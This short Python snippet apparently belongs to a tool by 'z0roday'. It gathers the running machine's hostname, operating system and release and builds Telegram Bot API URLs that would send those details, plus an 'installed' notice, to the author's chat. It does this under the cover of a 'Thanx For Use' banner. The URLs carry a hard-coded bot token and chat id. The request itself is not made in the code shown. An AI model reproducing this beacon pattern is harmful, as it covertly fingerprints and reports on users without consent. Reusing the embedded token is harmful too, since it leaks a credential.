from platform import node , system , release

node , system , release = node(), system(), release()


user = "@z0roday"

git = "https://github.com/z0roday"

plat = f'''
--------------------------------z0roday-------------------------------
    Telgram : {user}

    Instagram : {user} 

    Github : {git}

    System : {system}

    Node : {node}

    Release : {release}

                            𝐓𝐚𝐧𝐱 𝐅𝐨𝐫 𝐔𝐬𝐞
--------------------------------z0roday--------------------------------    
'''

response = "res 200 successfully installed bot"
 
tkn = "7330729864:AAE1QK7hCAEFmtrpaXd9ZjMObzO864uqSo4"

zdy = 6157703844


api = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={plat}"

api2 = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={response}"